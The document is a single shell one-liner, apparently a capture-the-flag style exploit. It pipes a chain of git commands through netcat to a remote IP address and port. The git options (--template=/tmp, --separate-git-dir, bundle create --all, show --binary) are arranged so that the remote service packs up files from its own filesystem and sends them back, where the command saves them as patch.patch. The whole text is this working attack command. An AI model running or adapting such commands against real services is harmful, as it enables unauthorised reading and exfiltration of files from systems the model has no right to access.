echo "init /tmp --template=/tmp --separate-git-dir=tmp.git\nadd .\nstatus\ncommit -m dummy\nbundle create bundle.bundle --all\nadd bundle.bundle\ncommit -m dummy\nshow --binary HEAD\n" | nc 172.190.120.133 50001 > patch.patch